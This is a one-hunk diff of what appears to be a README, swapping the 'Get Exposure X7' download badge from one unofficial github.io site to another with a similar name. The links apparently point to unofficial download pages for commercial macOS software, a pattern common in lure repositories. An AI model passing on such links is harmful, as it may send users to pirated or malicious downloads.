@@ -5,7 +5,7 @@
 <br>
 
 <p align="center">
-  <a href="https://osx-aplications.github.io/.github/exposure">
+  <a href="https://osx-quick-app.github.io/.github/exposure">
     <img src="https://img.shields.io/badge/Get%20Exposure%20X7-green?style=for-the-badge&logo=apple&logoColor=white" alt="Get Exposure X7">
   </a>
 </p>
